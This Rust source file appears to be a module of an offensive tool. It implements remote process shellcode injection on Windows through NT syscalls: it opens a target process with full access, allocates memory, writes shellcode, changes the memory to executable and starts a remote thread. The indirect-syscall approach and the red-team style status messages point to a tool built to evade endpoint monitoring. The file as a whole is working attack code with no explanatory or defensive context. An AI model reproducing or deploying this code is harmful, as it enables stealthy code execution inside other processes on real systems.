use core::ffi::c_void;
use syscalls::syscall;

#[repr(C)]
struct ClientId {
    unique_process: *mut c_void,
    unique_thread: *mut c_void,
}

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: *mut c_void,
    object_name: *mut c_void,
    attributes: u32,
    security_descriptor: *mut c_void,
    security_quality_of_service: *mut c_void,
}

impl ObjectAttributes {
    fn zeroed() -> Self {
        Self {
            length: core::mem::size_of::<Self>() as u32,
            root_directory: core::ptr::null_mut(),
            object_name: core::ptr::null_mut(),
            attributes: 0,
            security_descriptor: core::ptr::null_mut(),
            security_quality_of_service: core::ptr::null_mut(),
        }
    }
}

const PROCESS_ALL_ACCESS: usize = 0x1F_FFFF;
const MEM_COMMIT_RESERVE: usize = 0x3000;
const PAGE_READWRITE: usize = 0x04;
const PAGE_EXECUTE_READ: usize = 0x20;
const THREAD_ALL_ACCESS: usize = 0x1F_FFFF;

fn nt_ok(status: i32) -> bool {
    status >= 0
}

pub fn inject_shellcode_indirect(pid: u32, shellcode: &[u8]) -> String {
    unsafe {
        let mut handle: isize = 0;
        if let Err(e) = nt_open_process(&mut handle, pid) {
            return e;
        }

        let base = match nt_alloc_memory(handle, shellcode.len()) {
            Ok(addr) => addr,
            Err(e) => {
                nt_close(handle);
                return e;
            }
        };

        if let Err(e) = nt_write_memory(handle, base, shellcode) {
            nt_close(handle);
            return e;
        }

        if let Err(e) = nt_protect_memory(handle, base, shellcode.len(), PAGE_EXECUTE_READ) {
            nt_close(handle);
            return e;
        }

        let mut thread: isize = 0;
        if let Err(e) = nt_create_thread(&mut thread, handle, base) {
            nt_close(handle);
            return e;
        }

        nt_close(thread);
        nt_close(handle);
        format!(
            "[+] Injected {} bytes into PID {} (indirect syscall)",
            shellcode.len(),
            pid
        )
    }
}

unsafe fn nt_open_process(handle: &mut isize, pid: u32) -> Result<(), String> {
    let mut oa = ObjectAttributes::zeroed();
    let mut cid = ClientId {
        unique_process: pid as *mut c_void,
        unique_thread: core::ptr::null_mut(),
    };
    let status = syscall!(
        "NtOpenProcess",
        handle as *mut isize as usize,
        PROCESS_ALL_ACCESS,
        &mut oa as *mut ObjectAttributes as usize,
        &mut cid as *mut ClientId as usize
    );
    if nt_ok(status) {
        Ok(())
    } else {
        Err(format!("[-] NtOpenProcess failed: 0x{:08X}", status as u32))
    }
}

unsafe fn nt_alloc_memory(process: isize, size: usize) -> Result<*mut c_void, String> {
    let mut base: *mut c_void = core::ptr::null_mut();
    let mut region = size;
    let status = syscall!(
        "NtAllocateVirtualMemory",
        process as usize,
        &mut base as *mut *mut c_void as usize,
        0usize,
        &mut region as *mut usize as usize,
        MEM_COMMIT_RESERVE,
        PAGE_READWRITE
    );
    if nt_ok(status) {
        Ok(base)
    } else {
        Err(format!(
            "[-] NtAllocateVirtualMemory failed: 0x{:08X}",
            status as u32
        ))
    }
}

unsafe fn nt_write_memory(process: isize, base: *mut c_void, data: &[u8]) -> Result<(), String> {
    let mut written: usize = 0;
    let status = syscall!(
        "NtWriteVirtualMemory",
        process as usize,
        base as usize,
        data.as_ptr() as usize,
        data.len(),
        &mut written as *mut usize as usize
    );
    if nt_ok(status) {
        Ok(())
    } else {
        Err(format!(
            "[-] NtWriteVirtualMemory failed: 0x{:08X}",
            status as u32
        ))
    }
}

unsafe fn nt_protect_memory(
    process: isize,
    base: *mut c_void,
    size: usize,
    new_protect: usize,
) -> Result<(), String> {
    let mut region_base = base;
    let mut region_size = size;
    let mut old_protect: u32 = 0;
    let status = syscall!(
        "NtProtectVirtualMemory",
        process as usize,
        &mut region_base as *mut *mut c_void as usize,
        &mut region_size as *mut usize as usize,
        new_protect,
        &mut old_protect as *mut u32 as usize
    );
    if nt_ok(status) {
        Ok(())
    } else {
        Err(format!(
            "[-] NtProtectVirtualMemory failed: 0x{:08X}",
            status as u32
        ))
    }
}

unsafe fn nt_create_thread(
    thread: &mut isize,
    process: isize,
    start_addr: *mut c_void,
) -> Result<(), String> {
    let null = core::ptr::null_mut::<c_void>() as usize;
    let status = syscall!(
        "NtCreateThreadEx",
        thread as *mut isize as usize,
        THREAD_ALL_ACCESS,
        null,
        process as usize,
        start_addr as usize,
        null,
        0usize,
        0usize,
        0usize,
        0usize,
        null
    );
    if nt_ok(status) {
        Ok(())
    } else {
        Err(format!(
            "[-] NtCreateThreadEx failed: 0x{:08X}",
            status as u32
        ))
    }
}

unsafe fn nt_close(handle: isize) {
    let _ = syscall!("NtClose", handle as usize);
}
